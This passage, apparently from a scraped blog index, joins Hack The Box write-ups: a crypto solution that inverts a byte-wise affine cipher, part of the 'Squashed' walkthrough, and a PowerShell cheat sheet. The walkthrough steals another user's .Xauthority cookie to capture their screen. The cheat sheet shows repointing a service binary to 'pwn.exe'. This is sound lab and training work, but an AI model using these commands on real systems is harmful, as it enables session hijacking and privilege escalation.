As a secret agent, you have infiltrated the group enough to be included in meetings with clients. During the last negotiation, you found one of the confidential messages for the customer. It contains crucial information about the delivery. Do you think you can decrypt it?\u0026rdquo; - HTB challenge\nLet\u0026rsquo;s begin We\u0026rsquo;re given two files from the zip file, msg.enc and chall.py.\nThe content of the msg.enc\nThe content of the chall.py\nIt seems like the encryption algorithm used to generate msg.enc. There we can see that MSG is imported from the \u0026ldquo;secret\u0026rdquo; which we are trying to recover. If you take a closer look into the encryption function, there is a modulo operation used, which indicates that it is impossible to make a symmetrical decrypting equation (well, at least in my head).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string # from secret import MSG def encryption(msg): ct = [] for char in msg: ct.append((123 * char + 18) % 256) return bytes(ct) #ct = encryption(MSG) # f = open(\u0026#39;./msg.enc\u0026#39;,\u0026#39;w\u0026#39;) # f.write(ct.hex()) # f.close() sample1 = b\u0026#39;a\u0026#39; sample2 = b\u0026#39;ab\u0026#39; ct1 = encryption(sample1) ct2 = encryption(sample2) print(ct1.hex()) print(ct2.hex()) Modified some codes to see how this works.\nThe output:\n1 2 ad # from b\u0026#39;a\u0026#39; ad28 # from b\u0026#39;ab\u0026#39; This encryption algorithm takes each bytes in the string, does some maths, and prints out in the \u0026lsquo;double digit\u0026rsquo; hex format.\n\u0026lsquo;a\u0026rsquo; -\u0026gt; \u0026lsquo;ad\u0026rsquo;,\n\u0026lsquo;b\u0026rsquo; -\u0026gt; \u0026lsquo;28\u0026rsquo;\nWith knowing all these, one thing we can try is to map all printable characters to those encrypted hex outputs. At the end, we can split the encrypted message by chunk of two bytes and use the map to convert those back to plain text.\nExample:\nsecret = 6e0a9372ec49a3\n6e0a9372ec49a3 -\u0026gt; 6e|0a|93|72|ec|49|a3 -\u0026gt; map[\u0026lsquo;62\u0026rsquo;], map[\u0026lsquo;0a\u0026rsquo;], map[\u0026lsquo;93\u0026rsquo;], map[\u0026lsquo;72\u0026rsquo;] \u0026hellip;\nThe code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import string def createMap(msg): MAP = dict() for char in msg: enc = (123 * char + 18) % 256 ct = hex(enc)[2:].zfill(2) MAP[ct] = chr(char) return MAP S = string.printable.encode() # Assign all printable characters in byte format to variable \u0026#39;S\u0026#39; MAP = createMap(S) secret = input(\u0026#39;\\nEnter encrypted message:\\n\\n\u0026#39;) print(\u0026#39;\\n\\nRecovered message:\\n\u0026#39;) for i in range(0, len(secret), 2): ct = secret[i:i+2] print(MAP[ct], end=\u0026#39;\u0026#39;) print() Created map:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 22 -\u0026gt; 0 9d -\u0026gt; 1 18 -\u0026gt; 2 93 -\u0026gt; 3 0e -\u0026gt; 4 89 -\u0026gt; 5 04 -\u0026gt; 6 7f -\u0026gt; 7 fa -\u0026gt; 8 75 -\u0026gt; 9 ad -\u0026gt; a 28 -\u0026gt; b a3 -\u0026gt; c 1e -\u0026gt; d 99 -\u0026gt; e 14 -\u0026gt; f 8f -\u0026gt; g 0a -\u0026gt; h 85 -\u0026gt; i 00 -\u0026gt; j 7b -\u0026gt; k f6 -\u0026gt; l 71 -\u0026gt; m ec -\u0026gt; n 67 -\u0026gt; o e2 -\u0026gt; p 5d -\u0026gt; q d8 -\u0026gt; r 53 -\u0026gt; s ce -\u0026gt; t 49 -\u0026gt; u c4 -\u0026gt; v 3f -\u0026gt; w ba -\u0026gt; x 35 -\u0026gt; y b0 -\u0026gt; z 4d -\u0026gt; A c8 -\u0026gt; B 43 -\u0026gt; C be -\u0026gt; D 39 -\u0026gt; E b4 -\u0026gt; F 2f -\u0026gt; G aa -\u0026gt; H 25 -\u0026gt; I a0 -\u0026gt; J 1b -\u0026gt; K 96 -\u0026gt; L 11 -\u0026gt; M 8c -\u0026gt; N 07 -\u0026gt; O 82 -\u0026gt; P fd -\u0026gt; Q 78 -\u0026gt; R f3 -\u0026gt; S 6e -\u0026gt; T e9 -\u0026gt; U 64 -\u0026gt; V df -\u0026gt; W 5a -\u0026gt; X d5 -\u0026gt; Y 50 -\u0026gt; Z ed -\u0026gt; ! 68 -\u0026gt; \u0026#34; e3 -\u0026gt; # 5e -\u0026gt; $ d9 -\u0026gt; % 54 -\u0026gt; \u0026amp; cf -\u0026gt; \u0026#39; 4a -\u0026gt; ( c5 -\u0026gt; ) 40 -\u0026gt; * bb -\u0026gt; + 36 -\u0026gt; , b1 -\u0026gt; - 2c -\u0026gt; . a7 -\u0026gt; / f0 -\u0026gt; : 6b -\u0026gt; ; e6 -\u0026gt; \u0026lt; 61 -\u0026gt; = dc -\u0026gt; \u0026gt; 57 -\u0026gt; ?

But remember that we can impersonate ross due to misconfiguration in NFS service.\nThere are many files but we have to focus on the files that are only readable by the user ross which cannot be seen with the alex\u0026rsquo;s user account inside the target system. The most intriguing one of them is .Xauthority file, since we know ross is running a graphical environment.\nhttps://askubuntu.com/questions/300682/what-is-the-xauthority-file\nAlso looking into .xsession-errors, we get some more information.\nRoss is running lightdm and it is likely that ross is running on DISPLAY:0. We can verify it by taking a screenshot using the credential cookie from .Xauthority.\nCopy .Xauthority to target machine so that alex can import it.\n1 2 3 echo COPIED_BASE64_STRING | base64 -d \u0026gt; copied_cred export XAUTHORITY=/home/alex/copied_cred xwd -root -display :0 -out screenshot.xwd Exported the ross\u0026rsquo;s Xauthority cookie and tried to take screenshot.

I also spent a lot of time on trying to crack the KeePass database. However, ross was actually running this program on the GUI and the way to get this was to steal ross\u0026rsquo;s Xauth cookie to see ross\u0026rsquo;s screen.\nMachine pwned.\n","date":"2022-03-06T00:00:00Z","image":"https://sudo-echo-jin.github.io/p/squashed/Squashed.png","permalink":"https://sudo-echo-jin.github.io/p/squashed/","title":"Squashed"},{"content":"Cover photo by https://unsplash.com/@slrncl\nPowershell Commands Services 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # List all running services Get-Service | ? {$_.Status -eq \u0026#34;Running\u0026#34;} | select -First 2 |fl # Handle specific service sc qc SERVICE_NAME # Query service sc start SERVICE_NAME sc stop SERVICE_NAME sc config SERVICE_NAME KEY=VALUE # ex) sc config wuauserv binPATH=C:\\Windows\\pwn.exe sc sdshow SERVICE_NAME # List running application under currently logged in user reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run # Query specific service with the registry (returns more info than sc) Get-ACL -Path HKLM:\\PATH\\TO\\SERVICE # Check Windows Defender Get-MpComputerStatus Scripts 1 2 3 4 5 6 .\\SCRIPT.ps1 # Execute script .\\SCRIPT.ps1;MODULE # Excute particular module from the script Import-Module .\\SCRIPT.ps1 # Import modules from the script Get-Module # List all loaded modules Get-ExecutionPolicy -List Set-ExecutionPolicy POLICY -Scope SCOPE # Can set policy if proper rights given.
